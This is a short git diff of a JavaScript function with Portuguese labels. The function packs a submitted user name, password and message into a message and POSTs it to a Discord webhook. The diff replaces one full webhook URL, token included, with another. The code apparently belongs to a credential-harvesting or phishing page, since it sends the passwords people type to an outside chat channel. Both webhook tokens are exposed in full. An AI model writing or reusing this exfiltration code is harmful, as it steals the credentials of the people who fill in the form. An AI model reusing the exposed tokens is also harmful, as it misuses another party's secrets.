@@ -8,7 +8,7 @@ function enviarMensagem() {
     content: `🔐 Nova submissão:\n\n👤 Usuário: ${usuario}\n🔑 Senha: ${senha}\n💬 Mensagem: ${mensagem}`
   };
 
-  fetch("https://discord.com/api/webhooks/1375646657512865802/jGPklKjrApD8Rj2AYPatSal3C-QKfwPjMpODQrllPWdK3Tl0VZq88qAgpw08CUPfG--1", {
+  fetch("https://discord.com/api/webhooks/1377747470624358530/bSMO4BvPfMmK9IVls4_zCxHrWH0xm0MbInAMFm3HNZY_dFoBXd9GGkXTS03KPfNKWYeY", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
